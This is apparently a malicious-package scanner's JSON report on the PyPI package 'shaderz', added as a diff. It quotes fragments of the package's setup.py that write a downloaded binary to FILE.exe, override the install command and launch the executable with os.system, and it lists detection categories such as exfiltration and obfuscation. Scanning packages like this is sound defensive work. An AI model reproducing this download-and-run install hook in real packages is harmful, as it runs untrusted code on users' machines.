@@ -1,0 +1,36 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "dll-hijacking": {},
+        "download-executable": [
+            {
+                "location": "setup.py:24",
+                "code": "    open(\"FILE.exe\", \"wb\").write(response.content)\n",
+                "message": "This package is downloading making executable a remote binary"
+            }
+        ],
+        "shady-links": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:41",
+                "code": "setup(\n    name='shaderz',\n    version='0.0.1',\n    description='Beautify your output with this amazing package!',\n    long_description=\"\",\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n ...,\n    },\n)",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "exfiltrate-sensitive-data": {},
+        "obfuscation": {},
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": [
+            {
+                "location": "setup.py:25",
+                "code": "    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start FILE.exe\")\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/shaderz-0.0.1"
+}
